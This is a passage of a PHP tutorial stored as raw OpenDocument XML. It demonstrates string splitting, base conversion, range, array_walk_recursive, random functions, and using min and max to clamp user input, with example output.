      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T158">1 </text:span><text:span text:style-name="T166">=&gt;</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T168">'great'</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T159">(length=5)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T158">2 </text:span><text:span text:style-name="T166">=&gt;</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T168">'big'</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T159">(length=3)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T158">3 </text:span><text:span text:style-name="T166">=&gt;</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T168">'white'</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T159">(length=5)</text:span></text:p>
      <text:p text:style-name="P131"><text:s text:c="2"/><text:span text:style-name="T158">4 </text:span><text:span text:style-name="T166">=&gt;</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T168">'world!'</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T159">(length=6)</text:span><text:bookmark-end text:name="__DdeLink__507_1892330286"/></text:p>
      <text:p text:style-name="P47"><text:tab/><text:bookmark-start text:name="__DdeLink__505_1892330286"/><text:span text:style-name="T184">As you can see it's really simple and it really works.</text:span> Also you can pass another delimiter-symbol or even delimiter-string if you want. For example in case you are going to explode a CSV string <text:span text:style-name="T170">you can transmit a comma or a comma with a space as a parameter. Also there are built-in functions to work with CSV :)</text:span><text:bookmark-end text:name="__DdeLink__505_1892330286"/></text:p>
      <text:p text:style-name="P48"><text:tab/><text:bookmark-start text:name="__DdeLink__522_1892330286"/><text:span text:style-name="T170">You can notice that the array of words looks pretty illogical: some of the words contain punctuation marks because there are no spaces after commas and dots which are following the words. And that's how it should be in a normal text. In such situation you can continue working with this array and try to rid of punctuation marks inside the words. It's like try to peel potato cutting of the potato eyes. Instead of this you can just use the knife which is more suitable there:</text:span><text:bookmark-end text:name="__DdeLink__522_1892330286"/></text:p>
      <text:p text:style-name="P73"><text:span text:style-name="T79"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__518_1892330286"/><text:span text:style-name="T136">$sentence </text:span><text:span text:style-name="T153">= </text:span><text:span text:style-name="T143">"Hello, great big white world!"</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$words </text:span><text:span text:style-name="T130">= preg_split(</text:span><text:span text:style-name="T140">"/[\s,.!?]+/"</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T133">$sentence</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P123"><text:span text:style-name="T130">var_dump(</text:span><text:span text:style-name="T133">$words</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span><text:bookmark-end text:name="__DdeLink__518_1892330286"/></text:p>
      <text:p text:style-name="P115"><text:bookmark-start text:name="__DdeLink__520_1892330286"/><text:span text:style-name="T156">array</text:span><text:span text:style-name="T154"> (size=6)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T158">0 </text:span><text:span text:style-name="T166">=&gt;</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T168">'Hello'</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T159">(length=5)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T158">1 </text:span><text:span text:style-name="T166">=&gt;</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T168">'great'</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T159">(length=5)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T158">2 </text:span><text:span text:style-name="T166">=&gt;</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T168">'big'</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T159">(length=3)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T158">3 </text:span><text:span text:style-name="T166">=&gt;</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T168">'white'</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T159">(length=5)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T158">4 </text:span><text:span text:style-name="T166">=&gt;</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T168">'world'</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T159">(length=5)</text:span></text:p>
      <text:p text:style-name="P131"><text:s text:c="2"/><text:span text:style-name="T158">5 </text:span><text:span text:style-name="T166">=&gt;</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T168">''</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T159">(length=0)</text:span><text:bookmark-end text:name="__DdeLink__520_1892330286"/></text:p>
      <text:p text:style-name="P75"><text:tab/><text:bookmark-start text:name="__DdeLink__524_1892330286"/><text:span text:style-name="T185">p</text:span>reg_split function breaks the string into words basing on the regular expression but not on a <text:span text:style-name="T185">simple string-delimiter. That's why you are getting nice clear array. Except the last empty string but I</text:span> believe this problem is much more pleasant than the previous one :) Should notice that <text:span text:style-name="T171">for the </text:span><text:soft-page-break/><text:span text:style-name="T171">flexibility of this way you pay with your performance because regular expressions always work slower.</text:span><text:bookmark-end text:name="__DdeLink__524_1892330286"/></text:p>
      <text:p text:style-name="P74"><text:tab/><text:bookmark-start text:name="__DdeLink__533_1892330286"/><text:span text:style-name="T172">The next issue is more narrow-focused in a field of common tasks but I think everybody should know this function because it is simple like a stool and flexible like a swiss knife. The most desired tool when you are working with number systems:</text:span><text:bookmark-end text:name="__DdeLink__533_1892330286"/></text:p>
      <text:p text:style-name="P96"><text:bookmark-start text:name="__DdeLink__536_1892330286"/><text:span text:style-name="T134">$hexValue </text:span><text:span text:style-name="T131">= </text:span><text:span text:style-name="T140">'a</text:span><text:span text:style-name="T142">1</text:span><text:span text:style-name="T140">'</text:span><text:span text:style-name="T146">;</text:span></text:p>
      <text:p text:style-name="P123"><text:span text:style-name="T150">echo </text:span><text:span text:style-name="T130">base_convert(</text:span><text:span text:style-name="T133">$hexValue</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T173">16</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T173">10</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span><text:bookmark-end text:name="__DdeLink__536_1892330286"/></text:p>
      <text:p text:style-name="P109"><text:bookmark-start text:name="__DdeLink__538_1892330286"/>161<text:bookmark-end text:name="__DdeLink__538_1892330286"/></text:p>
      <text:p text:style-name="P76"><text:tab/><text:bookmark-start text:name="__DdeLink__540_1892330286"/>base_convert function converts value of any to any system. Also working not only with usual systems like 2, 3, 4, 8, 16, 32. I dare say that more local solutions like hex2bin, hexdec, octdec <text:span text:style-name="T175">(the title speaks for itself) are converting faster as it usually works. But I really like the first one because it demonstrates the whole flexibility and at the same time simpleness of PHP built-in solutions.</text:span><text:bookmark-end text:name="__DdeLink__540_1892330286"/></text:p>
      <text:p text:style-name="P76"><text:tab/><text:bookmark-start text:name="__DdeLink__552_1892330286"/><text:span text:style-name="T175">Often we get in a situation when we need a simple sequence of elements like from one to ten to get an array of marks when writing some rating system. There are built-in simple solutions for such tasks in other languages also. In PHP it is called range():</text:span><text:bookmark-end text:name="__DdeLink__552_1892330286"/></text:p>
      <text:p text:style-name="P95"><text:bookmark-start text:name="__DdeLink__554_1892330286"/><text:span text:style-name="T133">$decade </text:span><text:span text:style-name="T130">= range(</text:span><text:span text:style-name="T173">1</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T173">10</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T130">var_dump(</text:span><text:span text:style-name="T133">$decade</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$alphabetFirstHalf </text:span><text:span text:style-name="T130">= range(</text:span><text:span text:style-name="T140">'a'</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T140">'</text:span><text:span text:style-name="T141">m</text:span><text:span text:style-name="T140">'</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P123"><text:span text:style-name="T130">var_dump(</text:span><text:span text:style-name="T133">$alphabetFirstHalf</text:span><text:bookmark-end text:name="__DdeLink__554_1892330286"/></text:p>
      <text:p text:style-name="P110"><text:bookmark-start text:name="__DdeLink__556_1892330286"/><text:span text:style-name="T2">array</text:span> <text:span text:style-name="T154">(size=10)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">0 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">1</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">1 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">2</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">2 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">3</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">3 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">4</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">4 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">5</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">5 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">6</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">6 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">7</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">7 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">8</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">8 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">9</text:span></text:p>
      <text:p text:style-name="P131"><text:s text:c="2"/><text:span text:style-name="T157">9 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">10</text:span></text:p>
      <text:p text:style-name="P133"><text:span text:style-name="T2">array</text:span> <text:span text:style-name="T154">(size=14)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">0 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'a'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">1 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'b'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">2 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'c'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">3 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'d'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">4 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'e'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">5 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'f'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">6 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'g'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">7 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'h'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">8 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'i'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">9 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'j'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">10 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'k'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">11 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'l'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">12 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T169">'m'</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T155">(length=1)</text:span><text:bookmark-end text:name="__DdeLink__556_1892330286"/></text:p>
      <text:p text:style-name="P78"><text:tab/><text:bookmark-start text:name="__DdeLink__558_1892330286"/>But in PHP you can <text:span text:style-name="T186">easily</text:span> get an array of needed letters in an alphabet <text:s/><text:span text:style-name="T175">sequence with a help of this. You can also set <text:s/>the third parameter step to get an array like 0, 2, 4, 6, 8, 10. You can also instrument with negative values to implement your own flexible algorithm.</text:span><text:bookmark-end text:name="__DdeLink__558_1892330286"/></text:p>
      <text:p text:style-name="P77"><text:soft-page-break/><text:tab/><text:bookmark-start text:name="__DdeLink__560_1892330286"/><text:span text:style-name="T178">Array_walk_recursive can help you to process a multilevel json-array the way you like without writing your own recursive function.</text:span><text:bookmark-end text:name="__DdeLink__560_1892330286"/></text:p>
      <text:p text:style-name="P79"><text:span text:style-name="T177"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__562_1892330286"/><text:span text:style-name="T136">$json </text:span><text:span text:style-name="T153">= [</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T143">'one' </text:span><text:span text:style-name="T180">=&gt; </text:span><text:span text:style-name="T174">1</text:span><text:span text:style-name="T148">,</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T143">'two' </text:span><text:span text:style-name="T180">=&gt; [</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T143">'three' </text:span><text:span text:style-name="T180">=&gt; [</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="12"/></text:span><text:span text:style-name="T143">'four' </text:span><text:span text:style-name="T180">=&gt; </text:span><text:span text:style-name="T174">4</text:span><text:span text:style-name="T148">,</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="12"/></text:span><text:span text:style-name="T143">'five' </text:span><text:span text:style-name="T180">=&gt; [</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="16"/></text:span><text:span text:style-name="T143">'end' </text:span><text:span text:style-name="T180">=&gt; </text:span><text:span text:style-name="T143">'the end'</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T140"><text:s text:c="12"/></text:span><text:span text:style-name="T180">]</text:span></text:p>
      <text:p text:style-name="P107"><text:s text:c="8"/><text:span text:style-name="T179">]</text:span></text:p>
      <text:p text:style-name="P107"><text:s text:c="4"/><text:span text:style-name="T179">]</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T130">]</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T130">array_walk_recursive(</text:span><text:span text:style-name="T133">$json</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T150">function </text:span><text:span text:style-name="T130">(&amp;</text:span><text:span text:style-name="T133">$value</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T133">$key</text:span><text:span text:style-name="T130">)</text:span></text:p>
      <text:p text:style-name="P98">{</text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T136">$value </text:span><text:span text:style-name="T180">.= is_numeric(</text:span><text:span text:style-name="T136">$value</text:span><text:span text:style-name="T180">) ? </text:span><text:span text:style-name="T143">" is numeric" </text:span><text:span text:style-name="T180">: </text:span><text:span text:style-name="T143">" is not numeric"</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T130">})</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P123"><text:span text:style-name="T130">print_r(</text:span><text:span text:style-name="T133">$json</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span><text:bookmark-end text:name="__DdeLink__562_1892330286"/></text:p>
      <text:p text:style-name="P112"><text:bookmark-start text:name="__DdeLink__564_1892330286"/>Array</text:p>
      <text:p text:style-name="P111">(</text:p>
      <text:p text:style-name="P108"><text:s text:c="4"/><text:span text:style-name="T157">[one] =&gt; 1 is numeric</text:span></text:p>
      <text:p text:style-name="P108"><text:s text:c="4"/><text:span text:style-name="T157">[two] =&gt; Array</text:span></text:p>
      <text:p text:style-name="P108"><text:s text:c="8"/><text:span text:style-name="T157">(</text:span></text:p>
      <text:p text:style-name="P108"><text:s text:c="12"/><text:span text:style-name="T157">[three] =&gt; Array</text:span></text:p>
      <text:p text:style-name="P108"><text:s text:c="16"/><text:span text:style-name="T157">(</text:span></text:p>
      <text:p text:style-name="P108"><text:s text:c="20"/><text:span text:style-name="T157">[four] =&gt; 4 is numeric</text:span></text:p>
      <text:p text:style-name="P108"><text:s text:c="20"/><text:span text:style-name="T157">[five] =&gt; Array</text:span></text:p>
      <text:p text:style-name="P108"><text:s text:c="24"/><text:span text:style-name="T157">(</text:span></text:p>
      <text:p text:style-name="P108"><text:s text:c="28"/><text:span text:style-name="T157">[end] =&gt; the end is not numeric</text:span></text:p>
      <text:p text:style-name="P108"><text:s text:c="24"/><text:span text:style-name="T157">)</text:span></text:p>
      <text:p text:style-name="P121"/>
      <text:p text:style-name="P108"><text:s text:c="16"/><text:span text:style-name="T157">)</text:span></text:p>
      <text:p text:style-name="P121"/>
      <text:p text:style-name="P108"><text:s text:c="8"/><text:span text:style-name="T157">)</text:span></text:p>
      <text:p text:style-name="P121"/>
      <text:p text:style-name="P127">)<text:bookmark-end text:name="__DdeLink__564_1892330286"/></text:p>
      <text:p text:style-name="P80"><text:tab/><text:bookmark-start text:name="__DdeLink__569_1892330286"/>In situation when you need to get a random number <text:span text:style-name="T181">from a range</text:span>, randomly swap elements of an array <text:span text:style-name="T182">or symbols in string</text:span> or to fix your random for a time the next set of functions is your gentlemen's set:<text:bookmark-end text:name="__DdeLink__569_1892330286"/></text:p>
      <text:p text:style-name="P97"><text:bookmark-start text:name="__DdeLink__571_1892330286"/><text:span text:style-name="T130">mt_srand(</text:span><text:span text:style-name="T173">1</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T150">echo </text:span><text:span text:style-name="T130">mt_rand(</text:span><text:span text:style-name="T173">1</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T173">10</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$arr </text:span><text:span text:style-name="T130">= range(</text:span><text:span text:style-name="T173">1</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T173">5</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T130">shuffle(</text:span><text:span text:style-name="T133">$arr</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T130">var_dump(</text:span><text:span text:style-name="T133">$arr</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P123"><text:span text:style-name="T150">echo </text:span><text:span text:style-name="T130">str_shuffle(</text:span><text:span text:style-name="T140">'This sequence is correct!'</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span><text:bookmark-end text:name="__DdeLink__571_1892330286"/></text:p>
      <text:p text:style-name="P113"><text:bookmark-start text:name="__DdeLink__573_1892330286"/>6</text:p>
      <text:p text:style-name="P133"><text:span text:style-name="T2">array</text:span> <text:span text:style-name="T154">(size=5)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">0 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">4</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">1 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">2</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">2 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">3</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T157">3 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">1</text:span></text:p>
      <text:p text:style-name="P131"><text:s text:c="2"/><text:span text:style-name="T157">4 </text:span><text:span text:style-name="T167">=&gt;</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T165">int</text:span><text:span text:style-name="T157"> </text:span><text:span text:style-name="T176">5</text:span></text:p>
      <text:p text:style-name="P127">ouTnqehrrsc esecseii! ct <text:bookmark-end text:name="__DdeLink__573_1892330286"/></text:p>
      <text:p text:style-name="P130"><text:soft-page-break/><text:span text:style-name="T67"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__575_1892330286"/><text:span text:style-name="T68">You can remove the first function in a list to get new random numbers each time you run your program.</text:span><text:bookmark-end text:name="__DdeLink__575_1892330286"/></text:p>
      <text:p text:style-name="P130"><text:span text:style-name="T68"><text:tab/></text:span><text:span text:style-name="T69">Find out the smaller value from two is a usual taks, but PHP also has a function for such things.</text:span></text:p>
      <text:p text:style-name="P124"><text:span text:style-name="T80">echo </text:span><text:span text:style-name="T71">max(</text:span><text:span text:style-name="T96">10</text:span><text:span text:style-name="T82">, </text:span><text:span text:style-name="T96">20</text:span><text:span text:style-name="T71">)</text:span><text:span text:style-name="T82">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T150">echo </text:span><text:span text:style-name="T140">'&lt;br/&gt;'</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P123"><text:span text:style-name="T150">echo </text:span><text:span text:style-name="T130">min([</text:span><text:span text:style-name="T173">10</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T173">20</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T173">30</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T173">5</text:span><text:span text:style-name="T130">]</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T130">-</text:span><text:span text:style-name="T173">1</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T173">10</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P128"/>
      <text:p text:style-name="P128">20</text:p>
      <text:p text:style-name="P127">-1</text:p>
      <text:p text:style-name="P129"><text:tab/>As you can see it“s working not only with a simple couple of numbers.</text:p>
      <text:p text:style-name="P129"><text:tab/>Imagine that you have a user input. Mark that should vary from 1 to 5. For example you have no «required pattern» attribut on html input element or you are just getting this values from somewhere where there is no place for validation. The most glad people put 5, the ones who did“n like put 1… Ahaha?) Yes yes: user input… To «convert» 10000 into 5 and -50 into 1 you can do the following:</text:p>
      <text:p text:style-name="P125"><text:span text:style-name="T97">$mark </text:span><text:span text:style-name="T70">= </text:span><text:span text:style-name="T110">'100'</text:span><text:span text:style-name="T81">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$mark </text:span><text:span text:style-name="T130">= min(</text:span><text:span text:style-name="T133">$mark</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T173">5</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$mark </text:span><text:span text:style-name="T130">= max(</text:span><text:span text:style-name="T133">$mark</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T173">1</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P123"><text:span text:style-name="T150">echo </text:span><text:span text:style-name="T133">$mark</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P129">5</text:p>
